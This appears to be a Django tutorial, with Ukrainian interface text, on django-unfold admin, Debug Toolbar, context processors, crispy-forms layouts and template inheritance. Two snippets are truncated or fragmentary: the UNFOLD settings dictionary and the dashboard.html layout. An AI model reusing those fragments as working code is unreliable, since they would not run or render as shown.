docs.title: Phase G — Unfold Admin
docs.text: What is django-unfold? A library that replaces the standard Django Admin with a Tailwind-CSS-styled interface. It requires no changes to the logic — it only changes inheritance and adds an UNFOLD dictionary to settings.py.

docs.title: Step G1 — Updating hello_project/settings.py
docs.text:
Add the UNFOLD dictionary after MESSAGE_TAGS:

from django.urls import reverse_lazy
from django.utils.translation import gettext_lazy as _

UNFOLD = {
    "SITE_TITLE": "Bootstrap Notes",       # the title in <title>
    "SITE_HEADER": "Bootstrap Notes",      # the large header in the sidebar
    "SITE_SUBHEADER": "Управління нотатками",
    "SHOW_HISTORY": True,
    "SHOW_VIEW_ON_SITE": False,
    "SHOW_BACK_BUTTON": True,
    "SIDEBAR": {
        "show_search": False,
        "show_all_applications": False,
        "navigation": [
            {
                "title": _("Контент"),
                "separator": False,
                "collapsible": False,
                "items": [
                    {
                        "title": _("Нотатки"),
                        "icon": "description",  # Material Symbol icon
                        "link": reverse_lazy("admin:hello_app_note_changelist"),

            },
            {

icon — the icon name from Google Material Symbols. Write the name in lowercase with underscores: description, people, add_circle.

docs.title: Step G2 — Updating hello_app/admin.py
docs.text:
from django.contrib import admin
from django.contrib.auth.admin import UserAdmin as BaseUserAdmin
from django.contrib.auth.admin import GroupAdmin as BaseGroupAdmin
from django.contrib.auth.models import User, Group
from django.utils.html import format_html

# unfold.admin.ModelAdmin replaces django.contrib.admin.ModelAdmin
from unfold.admin import ModelAdmin
from unfold.forms import AdminPasswordChangeForm, UserChangeForm, UserCreationForm

from .models import Note


# Django registers User and Group without Unfold — unregister them and register them again
admin.site.unregister(User)
admin.site.unregister(Group)


@admin.register(User)
class UserAdmin(BaseUserAdmin, ModelAdmin):
    form = UserChangeForm
    add_form = UserCreationForm
    change_password_form = AdminPasswordChangeForm


@admin.register(Group)
class GroupAdmin(BaseGroupAdmin, ModelAdmin):
    pass


@admin.register(Note)
class NoteAdmin(ModelAdmin):
    list_display = ['title', 'short_content', 'created_at']
    search_fields = ['^title', 'content']
    list_filter = ['created_at']
    readonly_fields = ['created_at']
    ordering = ['-created_at']
    list_per_page = 20

    @admin.display(description='Зміст (preview)')
    def short_content(self, obj):
        if not obj.content:
            return '—'
        preview = obj.content[:80] + ('...' if len(obj.content) > 80 else '')
        return format_html('<span style="color:#6b7280">{}</span>', preview)

The key difference from the standard Django Admin:

Before (Django Admin) After (Unfold Admin) class NoteAdmin(admin.ModelAdmin) class NoteAdmin(ModelAdmin) No User/Group re-registration unregister + register with Unfold forms Branding: admin.site.site_header = ... Branding: UNFOLD["SITE_HEADER"] in settings.py No sidebar navigation UNFOLD["SIDEBAR"]["navigation"]

docs.title: Phase H — Django Debug Toolbar
docs.text:
The toolbar is already connected (we added it to Settings and URLs). Go to http://localhost:8000/notes/ — a black DJDT panel will appear on the right.

What to explore:

Panel What to look for SQL How many queries for /notes/? It should be 1–2 Templates Which templates were used (base.html + note_list.html) Headers Request/Response headers Time Template rendering time

If the toolbar does not appear: 1. DEBUG = True in settings.py? 2. Is INTERNAL_IPS = ['127.0.0.1'] in settings.py? 3. 'debug_toolbar' in INSTALLED_APPS? 4. debug_toolbar_urls() in urls.py? 5. Does the page have a <body> tag? (Needed to inject the panel)

docs.title: Context Processor
docs.text: Problem: The sidebar shows the list of notebooks and tags on EVERY page. If you pass them from every view, the code is duplicated in 20 places.

docs.title: How Context Processors work
docs.text:
HTTP Request
    ↓
Middleware pipeline
    ↓
View function (view_func)
    ↓
render(request, 'template.html', {'notes': notes})  ← view context
    ↓
Django Template Engine:
    1. Collects the context from the view: {'notes': notes}
    2. AUTOMATICALLY runs every context_processor(request) from settings.py
    3. Merged context = view context + processor contexts
    4. Renders the template with the merged context

All context_processors:
  django.template.context_processors.debug  → {{ debug }}
  django.template.context_processors.request → {{ request }}
  django.contrib.auth.context_processors.auth → {{ user }}, {{ perms }}
  django.contrib.messages.context_processors.messages → {{ messages }}
  hello_app.context_processors.sidebar_context → {{ sidebar_notebooks }}, {{ sidebar_tags }}

docs.title: Writing a Context Processor — the full context_processors.py code
docs.text:
# hello_app/context_processors.py
from django.db import OperationalError
from django.db.models import Q
from .models import TodoList, ShoppingList
from . import selectors


def sidebar_context(request):
    """
    Automatically adds sidebar_notebooks, sidebar_tags and task counters to every template.
    Runs on every request for authenticated users.
    """
    if not request.user.is_authenticated:
        return {
            'sidebar_notebooks': [], 'sidebar_tags': [],
            'sidebar_todo_count': 0, 'sidebar_shopping_count': 0,
        }

    user = request.user

    # try/except — protection in case the migration has not been applied yet (new M2M tables)
    try:
        todo_count = TodoList.objects.filter(
            Q(user=user) | Q(shared_with=user), is_completed=False
        ).distinct().count()
        shopping_count = ShoppingList.objects.filter(
            Q(user=user) | Q(shared_with=user)
        ).distinct().count()
    except OperationalError:
        todo_count = 0
        shopping_count = 0

    return {
        'sidebar_notebooks': selectors.get_user_notebooks(user),
        'sidebar_tags': selectors.get_user_tags(user),
        'sidebar_todo_count': todo_count,       # ← badge in "To-do lists"
        'sidebar_shopping_count': shopping_count,  # ← badge in "Shopping"
    }

Why try/except OperationalError? A context processor runs on every request. If the migration for a new table has not been applied yet (for example, during development after git pull), the QuerySet fails with OperationalError: no such table. The guard lets the server keep working — the counters simply return 0 instead of a 500 error.

docs.title: When NOT to use a context_processor
docs.text:
# Do not use a context_processor for:
# 1. Heavy SQL queries (they run on EVERY page)
# 2. Variables specific to a single page (pass them in the render context)
# 3. Data that needs URL parameters (url kwargs are not available)

# For a heavy sidebar: caching
from django.core.cache import cache

def sidebar_context(request):
    if not request.user.is_authenticated:
        return {}

    cache_key = f'sidebar_notebooks_{request.user.id}'
    notebooks = cache.get(cache_key)
    if notebooks is None:
        notebooks = list(selectors.get_user_notebooks(request.user))
        cache.set(cache_key, notebooks, timeout=300)  # 5 minutes

    return {'sidebar_notebooks': notebooks}

Important: A context processor runs on every HTTP request. So the selector must be efficient — select_related, annotate, no N+1.

docs.title: Crispy Forms
docs.text: FormHelper is an object attached to a form that describes: - The attributes of the <form> tag (method, action, id, class) - Rendering behavior - Layout — the structure and order of fields

docs.title: FormHelper architecture
docs.text:
NoteForm
│
├── fields (Django standard)
│   ├── title     CharField
│   ├── content   TextField
│   └── ...
│
└── helper = FormHelper()          ← crispy adds this
    ├── form_method = 'post'       ← <form method="post">
    ├── form_id = 'note-form'      ← <form id="note-form">
    ├── form_tag = True            ← render <form>...</form>
    └── layout = Layout(...)       ← field structure
        ├── Fieldset(...)          ← <fieldset><legend>
        │   ├── Field('title')     ← a single field with attrs
        │   └── Row(...)           ← <div class="row">
        │       ├── Column(...)    ← <div class="col-md-4">
        │       └── Column(...)    ← <div class="col-md-8">
        ├── Submit(...)            ← <button type="submit">
        └── HTML('<hr>')           ← arbitrary HTML

docs.title: Rendering pipeline
docs.text:
{% crispy form %}
     │
     ▼
crispy_forms templatetag
     │  Finds form.helper
     │  Finds form.helper.layout
     ▼
Layout.render(form, context)
     │
     ├── Fieldset.render()
     │   ├── Field('title').render()  → field.html template
     │   └── Row.render()
     │       └── Column.render()
     ├── Submit.render()              → baseinput.html template
     └── HTML.render()               → direct string
     │
     ▼
Bootstrap 5 HTML
(form-control, mb-3, row, col-md-4, invalid-feedback...)

Field('title', placeholder='Підказка')   # placeholder="Підказка"
Field('title', autofocus=True)           # autofocus
Field('title', data_custom="val")        # data-custom="val" (underscore → hyphen)
Field('title', css_class="extra")        # extra CSS class
Field('title', type="hidden")            # hidden input

# Wrapping div
Field('title', wrapper_class="mt-3")     # class for <div class="mb-3 mt-3">

docs.title: Where to use crispy vs. hand-written HTML — the rule
docs.text: Situation Approach The form takes up a whole page {% crispy form %} — full control through Layout Quick prototype {{ form\|crispy }} — no FormHelper, just Bootstrap styles A single field embedded in a page {{ form.title\|as_crispy_field }} A form without Bootstrap (API, email) {{ form.as_p }} or form.cleaned_data directly

docs.title: Full NoteForm code with FormHelper and Layout
docs.text:
# hello_app/forms.py
from django import forms
from crispy_forms.helper import FormHelper
from crispy_forms.layout import (
    Layout, Submit, Row, Column,
    Fieldset, HTML, Div, Field
)
from .models import Note, Notebook, Tag


class NoteForm(forms.ModelForm):
    class Meta:
        model = Note
        fields = ['title', 'content', 'priority', 'notebook', 'tags', 'is_pinned']
        # ↑ NO widget attrs at all — crispy adds Bootstrap classes automatically!

    def __init__(self, *args, user=None, **kwargs):
        super().__init__(*args, **kwargs)

        # Security: filter FKs by the current user
        if user is not None:
            self.fields['notebook'].queryset = Notebook.objects.filter(user=user)
            self.fields['tags'].queryset = Tag.objects.filter(user=user)
            self.fields['notebook'].empty_label = '— без записника —'

        # FormHelper — describe the form in Python code
        self.helper = FormHelper()
        self.helper.form_method = 'post'
        self.helper.form_id = 'note-form'

        # Layout — field structure
        self.helper.layout = Layout(
            # Section 1: main information
            Fieldset('Основна інформація',
                Field('title', placeholder='Назва нотатки...', autofocus=True),
                Row(
                    Column('priority', css_class='col-md-4'),
                    Column('notebook', css_class='col-md-8'),
                ),
            ),
            # Section 2: content
            Fieldset('Зміст нотатки',
                Field('content', rows=8, placeholder='Текст нотатки...'),
            ),
            # Section 3: tags and options
            Fieldset('Теги та параметри',
                'tags',
                Div(Field('is_pinned'), css_class='form-check mt-2'),
            ),
            # Divider
            HTML('<hr class="my-4">'),
            # Buttons
            Submit('submit', 'Зберегти нотатку', css_class='btn btn-primary me-2'),
            HTML('<a href="javascript:history.back()" class="btn btn-outline-secondary">Скасувати</a>'),
        )

docs.title: {% crispy form %} step by step
docs.text:
1. {% load crispy_forms_tags %} — registers the tag

2. {% crispy form %} — calls do_uni_form() in crispy_forms_tags.py

3. Finds form.helper — our FormHelper with its Layout

4. Renders form.helper.layout:
   ├── Fieldset('Основна інформація', ...) →
   │     <fieldset>
   │       <legend>Основна інформація</legend>
   │       ...fields...
   │     </fieldset>
   │

docs.title: The form_tag = False pattern — embedded forms
docs.text:
Sometimes a form is part of a larger page rather than a page of its own. For example: a todo list + an inline form for adding a new task on the same page.

Problem: if the template already has <form action="/todo/5/items/add/"> and crispy also renders a <form>, you end up with a nested <form> — invalid HTML; browsers ignore the inner <form>.

Solution: self.helper.form_tag = False — crispy renders only the fields and buttons, but not the <form>...</form> wrapper. The template provides the form tag itself.

# forms.py — TodoItemForm: embedded inside a <form> that exists in the template
class TodoItemForm(forms.Form):
    text = forms.CharField(max_length=500, label='Завдання')
    due_date = forms.DateField(required=False, widget=forms.DateInput(attrs={'type': 'date'}))

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.helper = FormHelper()
        self.helper.form_tag = False          # ← do not render <form>...</form>
        self.helper.form_show_labels = False  # ← no labels (compact look)
        self.helper.layout = Layout(
            Row(
                Column(Field('text', placeholder='Нове завдання...'), css_class='col-md-7'),
                Column(Field('due_date'), css_class='col-md-3'),
                Column(Submit('submit', '+ Додати', css_class='btn btn-primary w-100'),
                       css_class='col-md-2'),
            ),
        )

<!-- todo_detail.html — the template provides the <form> tag, crispy only the fields -->
<form method="post" action="{% url 'hello_app:todo_item_add' list.pk %}">
  {% csrf_token %}
  {% crispy item_form %}   ← renders a Row with fields and a button, but WITHOUT <form>
</form>
Scenario form_tag The form takes up its own page (note_create, note_edit) True (default) The form is embedded in a page (inline add item) False

docs.title: Dashboard Architecture
docs.text: SaaS Dashboard is a UI pattern for applications: a fixed sidebar on the left, a topbar on top, scrollable content in the center. Gmail, Notion, Linear — all of them are built on this pattern.

docs.title: Dashboard file tree
docs.text:
crispy_notes_project/
└── templates/
    ├── base.html                   ← Level 1: HTML5 + Bootstrap CDN
    └── layouts/
        └── dashboard.html          ← Level 2: Sidebar + Topbar + Messages

docs.title: Sidebar Context Processor
docs.text:
The sidebar shows notebooks and tags — they are needed on EVERY page. But passing them from every view by hand is duplication:

# ❌ Bad — duplication in every view
def note_list(request):
    notes = selectors.get_user_notes(request.user)
    notebooks = selectors.get_user_notebooks(request.user)  # duplication
    tags = selectors.get_user_tags(request.user)            # duplication
    return render(request, '...', {'notes': notes, 'notebooks': notebooks, 'tags': tags})

def note_create(request):
    notebooks = selectors.get_user_notebooks(request.user)  # duplication again
    tags = selectors.get_user_tags(request.user)            # duplication again
    ...

Solution — context_processors.py:

# ✅ Good — once, automatically for all views
def sidebar_context(request):
    if not request.user.is_authenticated:
        return {}
    return {
        'sidebar_notebooks': selectors.get_user_notebooks(request.user),
        'sidebar_tags': selectors.get_user_tags(request.user),
    }

# settings.py — register the processor
TEMPLATES = [{
    'OPTIONS': {
        'context_processors': [
            ...
            'hello_app.context_processors.sidebar_context',  # ← here
        ]
    }
}]

Now {{ sidebar_notebooks }} and {{ sidebar_tags }} are available in every template automatically.

Level 2 of the hierarchy. It:

  • Extends base.html

{% extends 'base.html' %}
{% load static %}

{% block body %}
<div class="d-flex vh-100 overflow-hidden">

    <hr>

    <ul class="nav nav-pills flex-column mb-3">

           data-bs-toggle="dropdown">

        <ul class="dropdown-menu dropdown-menu-dark dropdown-menu-end shadow">
          <li><a class="dropdown-item" href="{% url 'hello_app:notebook_list' %}">Мої записники</a></li>

    </main>

  </div>
  <!-- /MAIN -->

</div>

docs.title: Forms Evolution
docs.text: Three levels of form evolution — from "it just works" to "beautiful and without duplication". The very same NoteForm is rendered differently depending on the approach. The difference is only in the presentation layer — the business logic (services.create_note()) does not change.

docs.title: Why learn three levels
docs.text:
Django forms solve two independent tasks:

  1. Input validation — check that title is not empty and that priority is within the allowed range
  2. HTML rendering — display fields, labels and errors in the browser

The three Tiers differ only in rendering (item 2). Validation (is_valid(), cleaned_data) is the same in all three.

Tier Method Lines of HTML Where the Bootstrap classes live 1 — Raw {{ form.as_p }} ~5 Nowhere (no styles) 2 — Manual Hand-written HTML ~80 In the template, by hand 3 — Crispy {% crispy form %} 1 In forms.py via Layout

All three approaches pass the same NoteForm. The only difference is how it is rendered.

docs.title: A form as a Python class: anatomy of NoteForm
docs.text:
Before going through the levels, understand what NoteForm is.

# notes_app/forms.py
from django import forms
from .models import Note, Notebook, Tag


class NoteForm(forms.ModelForm):
    class Meta:
        model = Note
        fields = ['title', 'content', 'priority', 'notebook', 'tags', 'is_pinned']

        # Meta.widgets — configure the HTML attributes of the fields.
        # This applies to Tier 2. For Tier 3 (Crispy) — similar, but via Layout.
        widgets = {
            'title': forms.TextInput(attrs={
                'class': 'form-control',      # Bootstrap: border, padding, focus ring
                'placeholder': 'Назва нотатки...',
                'autofocus': True,            # the browser focuses this field automatically
            }),
            'content': forms.Textarea(attrs={
                'class': 'form-control',
                'rows': 8,                    # textarea height in rows
            }),
            'priority': forms.Select(attrs={
                'class': 'form-select',       # Bootstrap: style for <select>
            }),
            'notebook': forms.Select(attrs={
                'class': 'form-select',
            }),
            'is_pinned': forms.CheckboxInput(attrs={
                'class': 'form-check-input',  # Bootstrap: checkbox style
            }),
        }

        labels = {
            'title':    'Заголовок',
            'content':  'Текст нотатки',
            'priority': 'Пріоритет',
            'notebook': 'Записник',
            'tags':     'Теги',
            'is_pinned': 'Закріпити',
        }

        help_texts = {
            'notebook': 'Залиш порожнім — нотатка буде без записника.',
        }

    def __init__(self, *args, user=None, **kwargs):
        super().__init__(*args, **kwargs)
        # Filter choices by user — so that Alice cannot see Bob's notebooks
        if user is not None:
            self.fields['notebook'].queryset = Notebook.objects.filter(user=user)
            self.fields['tags'].queryset = Tag.objects.filter(user=user)

Key components:

Component Role Meta.model Which Django model — fields, types and validators come from here Meta.fields Which fields to include in the form (order matters) Meta.widgets How to render the HTML — class, placeholder, attributes Meta.labels The <label> text for each field Meta.help_texts A hint below the field (<div class="form-text">) __init__(user=) Custom queryset filtering by the current user

docs.title: Tier 1: Raw Django — {{ form.as_p }}
docs.text:
Why: The fastest way to display a form. Useful for debugging and prototypes. Validation works fully — only the appearance is minimal.

# views.py
from django.contrib.auth.decorators import login_required
from django.shortcuts import render, redirect
from . import forms, services


@login_required
def note_create_raw(request):
    if request.method == 'POST':
        form = forms.NoteForm(request.POST, user=request.user)
        if form.is_valid():
            note = services.create_note(
                user=request.user,
                title=form.cleaned_data['title'],
                content=form.cleaned_data.get('content', ''),
                priority=form.cleaned_data.get('priority', 2),
                notebook=form.cleaned_data.get('notebook'),
                tag_ids=[t.pk for t in form.cleaned_data.get('tags', [])],
                is_pinned=form.cleaned_data.get('is_pinned', False),
            )
            return redirect('notes_app:note_detail', pk=note.pk)
    else:
        form = forms.NoteForm(user=request.user)

    return render(request, 'notes_app/note_form_raw.html', {'form': form})

<!-- templates/notes_app/note_form_raw.html -->
{% extends 'base.html' %}
{% block content %}

<form method="post">
  {% csrf_token %}
  {{ form.as_p }}
  <button type="submit" class="btn btn-primary">Зберегти</button>
</form>

{% endblock %}

What as_p generates for the title field:

<p>
  <label for="id_title">Заголовок:</label>
  <input type="text" name="title" maxlength="200" required id="id_title">
</p>

Notice: not a single class="form-control". No Bootstrap styles at all. The form looks like bare HTML. Django validation works fully — is_valid(), cleaned_data, errors — but the errors are also displayed without styles:

<!-- On a validation error, as_p adds an ErrorList before the field: -->
<ul class="errorlist">
  <li>Це поле обов'язкове.</li>
</ul>
<p>
  <label for="id_title">Заголовок:</label>
  <input type="text" name="title" ...>
</p>

When to use Tier 1: - Debugging and testing a form - Internal admin tools where appearance does not matter - Never in production for end users

docs.title: Tier 2: Manual Bootstrap HTML
docs.text: Why: Full control over the HTML markup. Lets you place fields in a Bootstrap Grid and add icons and custom hints. Expensive to maintain — every new field = adding it to the template by hand.

docs.title: forms.py — widget attrs for Tier 2
docs.text:
Django renders a field through its Widget. To add a Bootstrap class to the <input>, you need to pass it through widget.attrs:

# Approach 1: via Meta.widgets (static attributes)
class Meta:
    widgets = {
        'title': forms.TextInput(attrs={'class': 'form-control'}),
    }

# Approach 2: via __init__ (dynamic attributes)
def __init__(self, *args, **kwargs):
    super().__init__(*args, **kwargs)
    self.fields['title'].widget.attrs.update({'class': 'form-control'})

Both approaches give the same result. The Meta.widgets approach is cleaner for static attributes. __init__ is needed when an attribute depends on runtime data.

Bootstrap class HTML element Effect form-control <input>, <textarea> Full width, border, padding, focus ring form-select <select> Dropdown arrow, padding, border form-check-input <input type="checkbox"> Custom checkbox style

docs.title: Anatomy of a BoundField in a template
docs.text:
form.title in a template is a BoundField: an object that knows the field + the current value + the form.

Expression Type Example value {{ form.title }} str (HTML) <input type="text" name="title" class="form-control" ...> {{ form.title.id_for_label }} str 'id_title' {{ form.title.label }} str 'Заголовок' {{ form.title.help_text }} str 'Залиш порожнім...' {{ form.title.html_name }} str 'title' {{ form.title.errors }} ErrorList ['Це поле обов'язкове.'] {% if form.title.errors %} bool True / False form.title.value() str 'Назва нотатки'

docs.title: Full template for a single field
docs.text:
<!-- templates/notes_app/note_form.html — rendering the title field by hand -->

<div class="mb-3">
    <!--
      .id_for_label → 'id_title'
      Clicking <label for="id_title"> focuses <input id="id_title"> — standard HTML behavior
    -->
    <label for="{{ form.title.id_for_label }}" class="form-label fw-semibold">
        {{ form.title.label }}
        {% if form.title.field.required %}
            <span class="text-danger ms-1">*</span>
        {% endif %}
    </label>

    <!--
      {{ form.title }} → Widget.render() → the full HTML <input> tag
      Attributes (class, placeholder, autofocus) come from Meta.widgets
    -->
    {{ form.title }}

    <!--
      help_text — a hint below the field. Present only if set in Meta.help_texts.
      Not set for title — the block is not shown.
    -->
    {% if form.title.help_text %}
    <div class="form-text text-muted">{{ form.title.help_text }}</div>
    {% endif %}

    <!--
      Validation errors. Empty on GET. Filled in if POST + is_valid() = False.
      Bootstrap: is-invalid + invalid-feedback show a red border and the error text.
    -->
    {% if form.title.errors %}
    {% for error in form.title.errors %}
    <div class="invalid-feedback d-block">{{ error }}</div>
    {% endfor %}
    {% endif %}
</div>

docs.title: Bootstrap Grid in a form
docs.text:
Bootstrap Grid lets you place several fields in one row:

<!--
  row + col-6 + col-6 = 12 Bootstrap Grid columns.
  g-3 = gutter (spacing between columns).
  The priority and notebook fields sit side by side in one row.
-->
<div class="row g-3 mb-3">

    <div class="col-6">
        <label for="{{ form.priority.id_for_label }}" class="form-label">
            {{ form.priority.label }}
        </label>
        {{ form.priority }}
        {% if form.priority.errors %}
        <div class="invalid-feedback d-block">{{ form.priority.errors|join:", " }}</div>
        {% endif %}
    </div>

    <div class="col-6">
        <label for="{{ form.notebook.id_for_label }}" class="form-label">
            {{ form.notebook.label }}
        </label>
        {{ form.notebook }}
        {% if form.notebook.help_text %}
        <div class="form-text">{{ form.notebook.help_text }}</div>
        {% endif %}
        {% if form.notebook.errors %}
        <div class="invalid-feedback d-block">{{ form.notebook.errors|join:", " }}</div>
        {% endif %}
    </div>

</div>

docs.title: Why novalidate on <form>
docs.text:
<form method="post" novalidate>
    {% csrf_token %}
    <!-- form fields -->
</form>

novalidate disables browser HTML5 validation (required, minlength, type="email").

Why this is right for Django: - Browser validation looks different in Chrome, Firefox and Safari — there is no single style - It does not know about Django-specific rules (clean_title(), custom validators) - Django validates on the server: always the same way, with your own error messages - After a POST with errors → the template is rendered again with form.errors → a single error style

{% csrf_token %} inserts a hidden input: 

<input type="hidden" name="csrfmiddlewaretoken" value="abc123XYZ...">
Django rejects a POST without this token with 403 Forbidden. This is protection against Cross-Site Request Forgery.

docs.title: Counting template lines for 5 fields
docs.text:
title:     14 lines
priority:  12 lines (select)
notebook:  14 lines (select + queryset)
content:   12 lines (textarea)
tags:      14 lines (multiple select / checkbox group)
is_pinned: 10 lines (checkbox)
buttons:    3 lines
─────────────────
TOTAL:    ~80 lines of HTML just for the form

Tier 2 problems: - 80 lines of HTML for just one form - Adding a field in models.py → add it by hand to every form template - Changing the Bootstrap version → edit every template - 10 forms in the application = 800 lines of duplication

docs.title: Tier 3: Crispy Forms — {% crispy form %}
docs.text: Why: Crispy moves all the Bootstrap markup from templates into forms.py. The template becomes one line. When you add a field, you edit only the Layout in forms.py; the template does not change.

docs.title: Installation
docs.text:
# requirements.txt
django-crispy-forms==2.3
crispy-bootstrap5==2024.10

# settings.py
INSTALLED_APPS = [
    ...
    'crispy_forms',
    'crispy_bootstrap5',
]

CRISPY_ALLOWED_TEMPLATE_PACKS = 'bootstrap5'
CRISPY_TEMPLATE_PACK = 'bootstrap5'

docs.title: forms.py with FormHelper and Layout
docs.text:
# notes_app/forms.py
from django import forms
from crispy_forms.helper import FormHelper
from crispy_forms.layout import Layout, Row, Column, Fieldset, Submit, Field

from .models import Note, Notebook, Tag


class NoteForm(forms.ModelForm):
    class Meta:
        model = Note
        fields = ['title', 'content', 'priority', 'notebook', 'tags', 'is_pinned']

    def __init__(self, *args, user=None, **kwargs):
        super().__init__(*args, **kwargs)

        # Queryset filtering — independent of the Tier
        if user is not None:
            self.fields['notebook'].queryset = Notebook.objects.filter(user=user)
            self.fields['tags'].queryset = Tag.objects.filter(user=user)

        # FormHelper — describes the HTML wrapper and the Layout
        self.helper = FormHelper()
        self.helper.form_method = 'post'        # <form method="post">
        self.helper.form_novalidate = True      # novalidate attribute

        self.helper.layout = Layout(
            # Fieldset = <fieldset><legend>Text</legend>...</fieldset>
            Fieldset('Основна інформація',
                # Field() — renders a field with extra HTML attributes
                Field('title', placeholder='Назва нотатки...', autofocus=True),
                # Row + Column = Bootstrap Grid
                Row(
                    Column('priority', css_class='col-md-4'),
                    Column('notebook', css_class='col-md-8'),
                ),
            ),
            Fieldset('Вміст',
                Field('content', rows=8),
                'tags',         # just the field name — rendered with default attributes
                'is_pinned',
            ),
            # Submit = the form's submit button
            Submit('submit', 'Зберегти нотатку', css_class='btn btn-primary'),
        )

docs.title: Template — one line
docs.text:
<!-- templates/notes_app/note_form.html -->
{% extends 'base.html' %}
{% load crispy_forms_tags %}

{% block content %}
{% crispy form %}
{% endblock %}

What {% crispy form %} generates automatically:

  • <form method="post" novalidate> + {% csrf_token %}
  • <fieldset><legend> for every Fieldset
  • <div class="row"> + <div class="col-md-4"> for Row + Column
  • <div class="mb-3"> for every field
  • <label class="form-label"> with the required asterisk
  • <input class="form-control"> or <select class="form-select">
  • <div class="invalid-feedback"> for errors
  • <div class="form-text"> for help_text
  • <button type="submit" class="btn btn-primary">

docs.title: Comparing views.py for all three Tiers
docs.text:
# views.py — the VIEW IS THE SAME for all three Tiers!
# Crispy is purely a PRESENTATION layer, not business logic.

@login_required
def note_create(request):
    if request.method == 'POST':
        form = NoteForm(request.POST, user=request.user)
        if form.is_valid():
            note = services.create_note(
                user=request.user,
                title=form.cleaned_data['title'],
                content=form.cleaned_data.get('content', ''),
                priority=form.cleaned_data.get('priority', 2),
                notebook=form.cleaned_data.get('notebook'),
                tag_ids=[t.pk for t in form.cleaned_data.get('tags', [])],
                is_pinned=form.cleaned_data.get('is_pinned', False),
            )
            messages.success(request, f'Нотатку "{note.title}" створено!')
            return redirect('notes_app:note_detail', pk=note.pk)
    else:
        form = NoteForm(user=request.user)

    return render(request, 'notes_app/note_form.html', {'form': form})

The view is the same for Tier 1, 2 and 3. Crispy does not change the business logic. It changes only how the form looks.

docs.title: Debugging: why the form does not validate
Symptom 1: a POST always shows the form again (never a redirect)
docs.text:
# ❌ CAUSE — `is_valid()` returns False, but you are not displaying the errors
if form.is_valid():
    ...  # ← execution never gets here

# Quick diagnosis — add a print to the view (temporarily):
print("POST data:", request.POST)
print("Form errors:", form.errors)

Run the view, send a POST from the browser, and check form.errors in the Django console:

Form errors: {
    'title': ['Це поле обов'язкове.'],
    'notebook': ['Виберіть правильний варіант. Цього варіанту немає серед доступних.']
}

docs.title: Symptom 2: notebook or tags always says "Select a valid choice"
docs.text:
# ❌ CAUSE — during the POST the field's queryset does not contain the submitted pks.
# A typical case: the default queryset is empty,
# and the real one is set only when user is passed:
class NoteForm(forms.ModelForm):
    tags = forms.ModelMultipleChoiceField(queryset=Tag.objects.none(), required=False)

    def __init__(self, *args, user=None, **kwargs):
        super().__init__(*args, **kwargs)
        if user is not None:
            self.fields['tags'].queryset = Tag.objects.filter(user=user)

form = NoteForm(user=request.user)   # GET  — the choices are visible
form = NoteForm(request.POST)        # POST — user forgotten → queryset = none()
                                     # → every choice is invalid

# ✅ SOLUTION — pass the same user in both GET and POST:
form = NoteForm(request.POST, user=request.user)
#               ↑ data        ↑ custom parameter

During validation, ModelChoiceField / ModelMultipleChoiceField checks that the submitted pk is in field.queryset at the time of the POST. If the POST queryset is narrower than the one the choices were rendered from, you get "Select a valid choice". The opposite situation is more dangerous because it is silent: without a filter in __init__ the queryset is Tag.objects.all() — validation accepts the pk of any tag, and Bob can see and attach Alice's tags. Therefore: always filter the queryset by user and pass user in both branches of the view.

docs.title: Symptom 3: CSRF 403 Forbidden
docs.text:
Forbidden (403)
CSRF verification failed. Request aborted.

Cause: the template does not contain {% csrf_token %}.

<!-- ✅ REQUIRED in every form with method="post" -->
<form method="post">
    {% csrf_token %}
    {{ form.as_p }}
</form>

For Crispy: {% crispy form %} adds the CSRF token automatically.

docs.title: Symptom 4: 'NoneType' object has no attribute on GET
docs.text:
AttributeError: 'NoneType' object has no attribute 'tags'

# ❌ CAUSE — user=None, and __init__ has no protection against None
form = NoteForm()   # user not passed → user=None

def __init__(self, *args, user=None, **kwargs):
    super().__init__(*args, **kwargs)
    self.fields['tags'].queryset = user.tags.all()   # None.tags → AttributeError

# ✅ Protection in __init__ — the if user is not None check:
def __init__(self, *args, user=None, **kwargs):
    super().__init__(*args, **kwargs)
    if user is not None:           # ← protection against None
        self.fields['tags'].queryset = Tag.objects.filter(user=user)

# ✅ For authenticated views there is always request.user:
form = NoteForm(user=request.user)

docs.text: Mistake Symptom Solution No {% csrf_token %} 403 Forbidden on POST Add {% csrf_token %} inside the <form> user= not passed Choices include other users' objects NoteForm(request.POST, user=request.user) method="get" instead of "post" Data ends up in the URL, the form is not processed <form method="post"> if request.method == 'GET': instead of 'POST': The form is never processed Check the condition in the view CRISPY_TEMPLATE_PACK is not set TemplateDoesNotExist: bootstrap5/uni_form.html Add CRISPY_TEMPLATE_PACK = 'bootstrap5' to settings.py Forgot {% load crispy_forms_tags %} Invalid block tag: 'crispy' Add {% load %} to the template

docs.title: Template Inheritance
docs.text: "Don't repeat HTML — inherit it." Django lets you build templates as a tree: the parent defines the structure, the child provides the content.

docs.title: Template Soup — the duplication problem
docs.text: "Template Soup" is when templates contain repeated blocks of HTML: <nav>, <header>, the Bootstrap CDN — copied into every file. Change the navigation → edit 20 files.

docs.title: Without Template Inheritance
docs.text:
<!-- note_list.html — 150 lines! -->
<!DOCTYPE html>
<html>
<head>
    <title>Нотатки</title>
    <link rel="stylesheet" href="...bootstrap.css">  ← COPY-PASTE
    <link rel="stylesheet" href="...bootstrap-icons.css">
</head>
<body>
<nav class="navbar navbar-dark bg-dark">             ← COPY-PASTE
    <a class="navbar-brand" href="/">CrispyNotes</a>
    ...20 lines of navigation...
</nav>
<main class="container my-4">
    <!-- 30 lines of real content -->
</main>
<footer>CrispyNotes © 2026</footer>            ← COPY-PASTE
<script src="...bootstrap.bundle.js"></script>       ← COPY-PASTE
</body>
</html>

<!-- note_form.html — another 150 lines! -->
<!DOCTYPE html>
<html>  ← An exact copy of the structure!
...

Problem: Changing the navbar → editing 20 files. One mistake (for example, a forgotten </nav>) → breaks all 20 pages.

docs.title: The duplication problem at the template level
docs.text:
<!-- notes_form.html — 80 lines for 5 fields -->
<div class="mb-3">
  <label for="id_title" class="form-label fw-semibold">
    Заголовок
    <span class="text-danger">*</span>
  </label>
  <input type="text"
         name="title"
         id="id_title"
         class="form-control {% if form.title.errors %}is-invalid{% endif %}"
         autofocus>
  {% if form.title.errors %}
    {% for error in form.title.errors %}
    <div class="invalid-feedback">{{ error }}</div>
    {% endfor %}
  {% endif %}
</div>

<!-- ... repeat for every field ... -->
